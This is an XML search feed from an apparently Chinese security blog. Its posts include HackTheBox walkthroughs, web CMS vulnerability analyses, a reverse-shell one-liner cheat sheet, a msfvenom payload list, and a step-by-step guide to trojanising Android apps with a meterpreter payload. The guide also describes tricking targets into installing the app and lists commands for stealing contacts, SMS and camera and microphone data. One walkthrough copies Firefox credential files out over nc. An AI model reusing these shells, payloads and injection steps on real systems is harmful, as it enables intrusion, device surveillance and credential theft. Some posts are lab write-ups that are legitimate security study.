<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB Frolic靶机渗透</title>
      <link href="/2019/03/25/%C2%96%C2%96HTB-Frolic%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2019/03/25/%C2%96%C2%96HTB-Frolic%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>##HTB Frolic靶机渗透</p><p>###靶机ip：10.10.10.111</p><p>###kali ip：10.10.13.7</p><p>####惯例来一波nmap，发现看有abyss服务，那么我们在浏览器进到9999端口。<br><img src="https://p5.ssl.qhimg.com/t01d483d5b9d6ddb975.png" alt=""></p><p>####发现只有一个nginx页面<br><img src="https://p2.ssl.qhimg.com/t011d431c0e144d5c80.png" alt=""></p><p>####那我们就用Dirb进行一波目录扫描<br><img src="https://p5.ssl.qhimg.com/t01d0bb850d0eb9d30b.png" alt=""></p><p>####目录扫描发现有一个Admin目录那我们进去发现是一个登录页面，仔细查看发现有一个login.js，我们进这个js文件查看发现有admin账号和pass密码。<br><img src="https://p0.ssl.qhimg.com/t01e74e2c9c6ac23a8f.png" alt=""></p><p>####使用账号密码登录后发现里面一串0ok编码的数据。使用下面网址可以解开:<code>https://www.dcode.fr/langage-ook</code><br><img src="https://p5.ssl.qhimg.com/t01eb96299f30840d9c.png" alt=""></p><p>####登录/asdiSIAJJ0QWE9JAS目录之后又看见一堆加密数据，这次采用的是base64加密，不过这次解密出来的是一个压缩文件。解密网站<code>https://www.base64decode.org/</code><br><img src="https://p3.ssl.qhimg.com/t01a35c0ab3aeb346ce.png" alt=""></p><p>####解密之后发现tar文件是加密，然后我们又不知道密码，那么我们只能爆破了。!<br><img src="https://p4.ssl.qhimg.com/t01a9a0be8e160eb660.png" alt=""></p><p>#####这次解密之后又是加密的数据，这次采用的是HEX加密。把Hex解密之后得到一串base64，我们使用上面的base64网站解密就好了。解密网站<code>http://www.unit-conversion.info/texttools/hexadecimal/#data</code><br><img src="https://p5.ssl.qhimg.com/t017a69c2ccd509a576.png" alt=""></p><p>#####base64解密之后我们又又有得到一串Brainfuck密文，在这次使用<code>https://www.splitbrain.org/_static/ook/</code>解密就好了<br><img src="https://p3.ssl.qhimg.com/t01777888a7373096b3.png" alt=""></p><p>#####OK，我们现在使用这个密码和账号进到playsms里面，在里面找了一圈发现里面没有什么地方可以getshell的。<br><img src="https://p2.ssl.qhimg.com/t013e4f4fad01e32db2.png" alt=""></p><p>#####刚好msf里面有playsms的exp，那么我们直接上shell。上shell成功了，我们来找flag。<br><img src="https://p3.ssl.qhimg.com/t01cb9f56484842a7ae.png" alt=""></p><p>######接下来我们开始提权，我们使用<code>find / -user root -perm -4000 -exec ls -ldb {} ; &gt; /tmp/ckprm</code>查看root进程，看先rop文件有点奇怪，使用该rop文件时发现，要求输入一段东西。这可能是一个libc提权。</p><p>#####那么我们开始提权把libc-search.c上传到目标机，然后执行<code>export PATH=/usr/lib/gcc/i686-linux-gnu/5:/sbin:/bin:/usr/sbin:/usr/bin</code>然后开始编译<code>gcc libc.c -o libc -lc -ldl</code>。libc-search.c下载网址<code>https://0xdeadbeef.info/code/libc-search.c</code></p><p>#####那现在开始找溢出点!<br><img src="https://p5.ssl.qhimg.com/t017b136147c11b8e76.png" alt=""></p><p>#####溢出点找完之后我们开始写Poc。<br><img src="https://p2.ssl.qhimg.com/t01f4e2e5cfb1646c0e.png" alt=""></p><p>#####poc写完之后开始提权。<br><img src="https://p1.ssl.qhimg.com/t018aca9bf92c9dfd54.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzzphp V1.6.1 远程代码执行漏洞分析</title>
      <link href="/2019/03/18/zzzphp-V1-6-1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/03/18/zzzphp-V1-6-1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="zzzphp-V1-6-1-远程代码执行漏洞分析"><a href="#zzzphp-V1-6-1-远程代码执行漏洞分析" class="headerlink" title="zzzphp V1.6.1 远程代码执行漏洞分析"></a>zzzphp V1.6.1 远程代码执行漏洞分析</h2><p>###漏洞产生原因：</p><h5 id="zzzphp-cms-，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。"><a href="#zzzphp-cms-，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。" class="headerlink" title="zzzphp cms ，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。"></a>zzzphp cms ，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。</h5><p>###源码审计：</p><p>#####打开/search/index.php<br><code>require dirname(dirname(__FILE__)). &#39;/inc/zzz_client.php&#39;;</code></p><h2 id="发现是跳到-inc-zzz-client-php，那么我们就来到-inc-zzz-client-php"><a href="#发现是跳到-inc-zzz-client-php，那么我们就来到-inc-zzz-client-php" class="headerlink" title="#####发现是跳到/inc/zzz_client.php，那么我们就来到/inc/zzz_client.php"></a>#####发现是跳到/inc/zzz_client.php，那么我们就来到/inc/zzz_client.php</h2><p><img src="https://p0.ssl.qhimg.com/t01d5725f65d9c71035.png" alt=""></p><p>#####发现解析模块是通过ParsetTemplate来解析的，那么我们找到ParserTemplate类的php文件zzz_template.php。</p><p>####在zzz_template.php中我们发现一个IF语句<br><code>$zcontent = $this-&gt;parserIfLabel( $zcontent ); // IF语句</code></p><p>#####那么我们来到zzz_template.php中对parserIfLabel的定义<br><img src="https://p2.ssl.qhimg.com/t016ef6c558b283cbf0.png" alt=""></p><p>#####发现$ifstr 经过一连串的花里胡哨的过滤最后进了evel函数，然后使用了evel函数执行，最后造成了本次远程代码执行漏洞。</p><p>###漏洞利用：</p><p>#####在后台模块管理中的电脑模块找到cn2016<br><img src="https://p3.ssl.qhimg.com/t0104a9b5787949c950.png" alt=""></p><p>#####然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为<code>{if:assert($_request[phpinfo()])}phpinfo();{end if}</code><br><img src="https://p5.ssl.qhimg.com/t0162996d1326d78828.png" alt=""></p><p>#####然后打开<code>http://xxxx.com/zzzcms/search/</code>就可以看到我们刚刚输入的phpinfo()执行了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell一句话</title>
      <link href="/2019/03/06/shell%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
      <url>/2019/03/06/shell%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
      
        <content type="html"><![CDATA[<p>###python脚本反弹<br>    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p><p>###php 脚本反弹<br>    php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p><p>###Java 脚本反弹<br>    r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()</p><p>###perl 脚本反弹<br>    perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p><p>###NC 监听一句话<br>    nc -v -l -v -p 8080</p><p>#####NC 无法使用su命令解决办法：<br>    python -c ‘import pty; pty.spawn(“/bin/sh”)’</p><p>python脚本反弹</p><p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br>php 脚本反弹</p><p>php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>Java 脚本反弹</p><p>r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()<br>perl 脚本反弹</p><p>perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>NC 监听一句话</p><p>nc -v -l -v -p 8080<br>NC 无法使用su命令解决办法：</p><p>python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>imap邮件服务器常用命令</title>
      <link href="/2019/03/06/imap%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/06/imap%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>###imap常用命令</p><p>####登陆: <code>A LOGIN USER PASS</code><br>        A是代号可以随便写 LOGIN是登录的意思，USER是用户名，PASS是密码。</p><p>####查询：A LIST  “” *</p><p>####选择 ：A SELECT  INBOX<br>        这里选择的是收件箱，如果是想选择草稿箱的话就把INBOX改成Drafts即可</p><p>####查看邮件：A fetch 1 body[text]<br>        1代表的是第一封邮件，text代表的是整个邮件整体，body[HEADER]代表的是返回完整的文件头信息。</p>]]></content>
      
      
      
        <tags>
            
            <tag> imap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Chaos</title>
      <link href="/2019/03/06/HackTheBox-Chaos/"/>
      <url>/2019/03/06/HackTheBox-Chaos/</url>
      
        <content type="html"><![CDATA[<p>###Chaos 靶机渗透</p><p>####靶机地址：<a href="https://www.hackthebox.eu/home/machines/profile/167" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/167</a></p><p>####目标IP: 10.10.10.120(Linux)</p><p>####本机IP: 10.10.14.97(Kali)</p><p>#####使用nmap对目标进行扫描 <code>nmap -sS 10.10.10.120</code><br><img src="https://p0.ssl.qhimg.com/t010487ac52686743fc.png" alt=""></p><p>######nmap返回的信息中告诉我们很多有用的信息:<br>        80：我们可以尝试在浏览器访问找出有用的信息<br>        110：运行有pop3邮件服务器<br>        143：运行imap邮件服务器<br>        993：imap邮件服务器的ssl通道<br>        995：pop3邮件服务器的ssl通道</p><p>#####我们访问WEB页面查看有什么可以利用的信息。</p><p>######发现web页面收禁止我们使用IP访问<br><img src="https://p0.ssl.qhimg.com/t0106e95f1a51e63771.png" alt=""></p><p>#####那我们使用drbp对目标进行一波目录扫描，看下有什么可用的信息。</p><p>######发现一个wordpress博客<br><img src="https://p1.ssl.qhimg.com/t01512e963acfa9e1b2.png" alt=""></p><p>#####我们进去博客发现它说让我们输入密码才能查看这个文章，那我们不知道密码怎么，那就是试着用作者名字是否就是密码，那我们也不知道作者名字啊。怎么办？这时候就要利用一个WP的一个小漏洞了。<br><img src="https://p5.ssl.qhimg.com/t017f442e90389b2223.png" alt=""></p><p>#####在浏览器上输入<code>?author=1</code>就会发现下面出现了作者的名字。这时候我们就把名字输入Password里面去。<br><img src="https://p1.ssl.qhimg.com/t0108a033f776181ba7.png" alt=""><br>这时候我们就看到了suer和pass，但是这里写着说是webmail的，也就是说这是邮箱服务器的账号密码，不是后台的。</p><p>######那么这时候我们登录邮件服务器。<br>        连接imap openssl s_client -connect 10.10.10.120:993`<br>        这里需要注意使用telnet是无法连接的，只有用ssl才能连接。<br>        然后输入 a LOGIN ayush jiujitsu<br>        这里的a是代号，顺便输入也行， LOGIN 是固定的，ayush是账号,jiujitsu是密码。<br><img src="https://p5.ssl.qhimg.com/t014d7f10de22a6ad78.png" alt=""></p><p>######进去imap服务器之后我们看下有什么可利用的信息。</p><p>######输入<code>a list &quot;&quot; *</code> 发现有一个叫INbox的箱子很是可疑。那么我们就进这个箱子看下。<br><img src="https://p0.ssl.qhimg.com/t0108c611885e8d8e1c.png" alt=""></p><p>######进这个箱子发现什么都没有，比我的脸还要干净。<br><img src="https://p4.ssl.qhimg.com/t012e2c5e51d1edfa0c.png" alt=""></p><p>######找来找去我们发现什么都没有，怎么办？突然想起邮件的草稿我们还没看，那么我们进去看下</p><p>######输入<code>* select Drafts</code>后发现里面有一个封草稿邮件，发现有邮件那么我们就看下这邮件里面有什么可利用的信息。</p><p>#####我们发现里面有两个文件，一个enim_msg.txt,一个是en.py。<br><img src="https://p1.ssl.qhimg.com/t01e385b171ac1cddc4.png" alt=""></p><p>######我们把这两个文件都copy下载</p><p>#####邮件中有提到base64解密，那么我们就把这两个文件都交给base64解一下。<br><img src="https://p4.ssl.qhimg.com/t013be8b2e07ddfcbc1.png" alt=""><br><img src="https://p3.ssl.qhimg.com/t01b160e11000c2475c.png" alt=""></p><p>#####两个文件我们只解出一个en.py，另一个enimg_msg.txt解出了还是加密的。那我们先不理enimg_msg文件，我们来看下en.py。<br><img src="https://p0.ssl.qhimg.com/t010788b4e7f6a261a2.png" alt=""></p><p>#####看了一遍又一遍看不懂这是什么，那直接把全部的代码都丢到google上面，然后发现了有一个完整的python脚本。<br><img src="https://p4.ssl.qhimg.com/t01b242da8a2c9aa2ca.png" alt=""></p><p>#####使用脚本来解enimg_msg.txt就得到一个web地址<br><img src="https://p1.ssl.qhimg.com/t0171b112d4269bc125.png" alt=""></p><p>#####那么我们现在来看下这个http地址有什么可以利用的信息。<br><img src="https://p3.ssl.qhimg.com/t0183455f39392850d9.png" alt=""></p><p>######发现这是一个txt转pdf的插件，那么我们google一下看下pdfTeX这个插件，发现有一个远程执行代码漏洞，那么我们马上开干。</p><p>#####这次用的是python返回shell一句话和nc，python一句话需要注意的是必须要进行url编码不然是无法使用的<br><img src="https://p2.ssl.qhimg.com/t017621fa2a12cfe77f.png" alt=""></p><p>#####getshell之后我们看下自己的权限，发现是www权限，那么我们就要进行提权，这时候我们来试下webemail的账号是否能在这里登录。<br><img src="https://p0.ssl.qhimg.com/t018b5dd9bc8e9ff0a4.png" alt=""></p><p>######ayush账号可以在这里登陆，那么我们就开始提权。PS：要是nc 无法执行su命令那么就执行 <code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code>就可以使用su命令了。</p><p>#####尝试提权</p><p>######查看我们可以使用什么命令，发现我们可以tar，那么我们就输入<br><code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh</code><br><img src="https://p2.ssl.qhimg.com/t01ac200fda735e580f.png" alt=""></p><p>#####这时候我们就可以使用/bin/sh，然后我们去到该用户的主目录，在这里我们找到了user.txt。<br><img src="https://p4.ssl.qhimg.com/t01786ebf836c6c56ad.png" alt=""></p><p>#####提权各种套路都试下了，还是无法提权，这时候想到.Mozilla是否存放有有关root的密码，因为如果有管理员这台机子上网说不定有保存密码，然而密码说不定就和root密码相同。在目标机上找到.mozilla文件里面的logins.json和key4.db 把他们copy到kali上。</p><pre><code>在目标机上执行`/bin/nc -w 3 10.10.12.163 5556 &lt; logins.json`在kali上执行`nc -l -p 5556 &gt; logins.json`</code></pre><p>#####把logins.json和key4.db文件覆盖了本地文件之后在火狐上查看密码，然后发现里面真的有root密码。<br><img src="https://p0.ssl.qhimg.com/t01f25a43ff0f0a7542.png" alt=""></p><p>#####使用root密码登陆进去，找到root.txt。<br><img src="https://p4.ssl.qhimg.com/t01a69e5bd87784012a.png" alt=""></p><p>####后记：虽然这次的靶机的脑洞很大，但是可以在里面学到很多东西，imap的命令操作，使用tar提权等等。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wpscan更新后出现错误</title>
      <link href="/2019/03/03/wpscan%E6%9B%B4%E6%96%B0%E5%90%8E%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF/"/>
      <url>/2019/03/03/wpscan%E6%9B%B4%E6%96%B0%E5%90%8E%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<p>#####错误信息”1: from /usr/lib/ruby/2.5.0/rubygems/specification.rb:1458:in <code>each&#39; /usr/lib/ruby/2.5.0/rubygems/specification.rb:1466:in</code>block in activate_dependencies’: can’t satisfy ‘public_suffix (~&gt; 3.0.0)’, already activated ‘public_suffix-2.0.5’ (gem::loaderror)”</p><p>######解决办法顺序执行下面的命令<br><code>apt-get install gem</code><br><code>apt remove wpscan</code><br><code>apt-get autoremove</code><br><code>apt-get install wpscan</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> wpscan错误 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动给Android应用注入Payload</title>
      <link href="/2019/02/25/%E6%89%8B%E5%8A%A8%E7%BB%99Android%E5%BA%94%E7%94%A8%E6%B3%A8%E5%85%A5Payload/"/>
      <url>/2019/02/25/%E6%89%8B%E5%8A%A8%E7%BB%99Android%E5%BA%94%E7%94%A8%E6%B3%A8%E5%85%A5Payload/</url>
      
        <content type="html"><![CDATA[<p>###如何给Android应用写入木马</p><p>#####文章中介绍的工具、技术带有一定的攻击性，仅供安全研究，请合理合法使用。</p><p>#####本文原创作者：XXX，本文属i春秋原创奖励计划，未经许可禁止转载！</p><p>####需要用到的工具：<br>    逆向工具：Android killer<br>    木马工具：Metasploit<br>5G时代的来临，让移动安全受到更大的热潮，而我刚好蹭下热点。现在大多数的安卓应用都可以轻易的使用一些反汇编软件能够轻松的对安卓应用进行植入木马病毒和恶意Payload。</p><p>####第一步：使用Metasploit生成需要的Payload<br><code>msf5 &gt; msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -o shell.apk</code><br><code>[*] exec: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -o shell.apk</code><br><code>[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload</code><br><code>[-] No arch selected, selecting arch: dalvik from the payload</code><br><code>No encoder or badchars specified, outputting raw payload</code><br><code>Payload size: 10090 bytes</code><br><code>Saved as: shell.apk</code></p><p>####第二步：反编译Android应用</p><p>#####使用反编译软件打开Android应用，我使用的是Android killer软件，其实在kali里面自带反编译软件的。<br><img src="https://p1.ssl.qhimg.com/t01a9f88e716f654bf2.png" alt=""></p><p>####第三步：寻找Android应用的入口文件和添加启动代码<br><img src="https://p0.ssl.qhimg.com/t01581fab3e300071cd.png" alt=""><br><img src="https://p5.ssl.qhimg.com/t017796c310b832d4af.png" alt=""><br>然后在onCreate函数里面添加Payload的启动文件<br><code>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V</code><br><img src="https://p0.ssl.qhimg.com/t01bb2e6785debf3c6d.png" alt=""></p><p>####第四步：添加Payload文件</p><p>#####使用反编译软件打开shell.apk，然后找到Metasploit文件<br><img src="https://p2.ssl.qhimg.com/t018cd8e7dc779f30a8.png" alt=""></p><p>#####然后把shell.apk下的Metasploit文件复制到需要植入Payload的apk里面的smali文件下的com的里面就可以了。<br><img src="https://p3.ssl.qhimg.com/t01c4c5c193b70fddf7.png" alt=""></p><p>####第五步：给Apk增加权限</p><p>#####打开shell.apk里面的AndroidManifest.xml，然后复制到需要植入Payload的apk里面的AndroidManifest.xml，需要注意的是权限的申请是唯一的，不能重复，不然可能会出现错误。<br><img src="https://p5.ssl.qhimg.com/t013a27e27ceca6b79e.png" alt=""></p><p>#####第六步：编译<br><img src="https://p3.ssl.qhimg.com/t015840998c58d4f624.png" alt=""></p><p>#####第七步：在Msf连接Payload<br><code>msf5 &gt; use exploit/multi/handler</code><br><code>msf5 exploit(multi/handler) &gt; set payload android/meterpreter/reverse_tcp</code><br><code>msf5 exploit(multi/handler) &gt; set LHOST 192.168.232.128</code><br><code>msf5 exploit(multi/handler) &gt; set LPORT 1111</code><br><code>msf5 exploit(multi/handler) &gt; exploit</code></p><p>#####第八步：利用社会工程学或者网马等技术让目标下载安装该APK，目标安装了该APK后我们就可以对目标的手机进行操作了。</p><p>######以下是Metasploit的一些Android Payload的命令<br>    webcam_list  列出网络摄像头<br>    record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒<br>    webcam_chat  开始视频聊天<br>    webcam_snap  从指定的摄像头获取快照<br>    webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头]<br>    activity_start  从URI字符串启动Android活动<br>    check_root  检查设备是否有根<br>    dump_calllog  获取调用日志<br>    dump_contacts  获取联系人列表<br>    dump_sms  获取短信<br>    geolocate  利用地理定位获取当前LAT<br>    wlan_geolocate  利用WLAN信息获取当前LAT<br>    hide_app_icon  从发射器隐藏应用程序图标<br>    interval_collect  管理区间收集能力<br>    send_sms  从目标会话发送短消息<br>    set_audio_mode<br>    sqlite_query  从存储库查询SQLite数据库<br>    wakelock  启用/禁用Wakelock</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit常用的Payload</title>
      <link href="/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/"/>
      <url>/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/</url>
      
        <content type="html"><![CDATA[<p>#####Metasploit最有用的能力之一就是msfpayload模块。使用msfpayload模块基本可以生成市场上各种系统、语言的payloads。</p><p>######列出有效payloads<br><code>msfvenom -l</code></p><p>######Linux<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p><p>######Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p><p>######Mac<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p><p>######Android<br><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.apk</code></p><p>######PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p><p>######ASP<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p><p>######JSP<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p><p>######WAR<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p><p>######Python<br><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p><p>######Bash<br><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p><p>######Perl<br><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p><p>######Linux Shellcode<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>######Windows Shellcode<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>######MAC Shellcode<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>连接Payloads:<br><code>use exploit/multi/handler</code><br><code>set payload linux/x86/meterpreter/bind_tcp</code><br><code>set RHOST 192.168.10.1</code><br><code>set LPORT 4444</code><br><code>exploit</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZZCMS任意删除漏洞“(CVE-2019-8411)</title>
      <link href="/2019/02/19/ZZCMS%E4%BB%BB%E6%84%8F%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E2%80%9C-CVE-2019-8411/"/>
      <url>/2019/02/19/ZZCMS%E4%BB%BB%E6%84%8F%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E2%80%9C-CVE-2019-8411/</url>
      
        <content type="html"><![CDATA[<h2 id="zzcms-任意删除文件漏洞-CVE-2019-8411-分析"><a href="#zzcms-任意删除文件漏洞-CVE-2019-8411-分析" class="headerlink" title="zzcms 任意删除文件漏洞(CVE-2019-8411) 分析"></a>zzcms 任意删除文件漏洞(CVE-2019-8411) 分析</h2><h3 id="Payload：action-del＆filename-1-php"><a href="#Payload：action-del＆filename-1-php" class="headerlink" title="Payload：action = del＆filename = .. / 1.php"></a>Payload：action = del＆filename = .. / 1.php</h3><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。"><a href="#这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。" class="headerlink" title="这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。"></a>这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。</h4><h5 id="打开admin-dl-data-php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。"><a href="#打开admin-dl-data-php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。" class="headerlink" title="打开admin/dl_data.php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。"></a>打开admin/dl_data.php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。</h5><p><img src="https://p3.ssl.qhimg.com/t01c727f1967ca7eba9.png" alt="![](https://p1.ssl.qhimg.com/t01bf0deb989f4d9684.png)"></p><h5 id="从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。"><a href="#从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。" class="headerlink" title="从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。"></a>从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。</h5><p><img src="https://p2.ssl.qhimg.com/t016f20f810d9885d7c.png" alt=""><br><img src="https://p3.ssl.qhimg.com/t01d7111a5d2d627cd6.png" alt=""></p><h5 id="进行简单的添加认证后，这个Payload-就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。"><a href="#进行简单的添加认证后，这个Payload-就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。" class="headerlink" title="进行简单的添加认证后，这个Payload 就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。"></a>进行简单的添加认证后，这个Payload 就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。</h5><p><img src="https://p4.ssl.qhimg.com/t0199eed13579d71097.png" alt=""><br><img src="https://p5.ssl.qhimg.com/t0176f7639cdf27d15b.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我们真的懂什么是黑客吗？</title>
      <link href="/2019/02/19/%E6%88%91%E4%BB%AC%E7%9C%9F%E7%9A%84%E6%87%82%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%91%E5%AE%A2%E5%90%97%EF%BC%9F/"/>
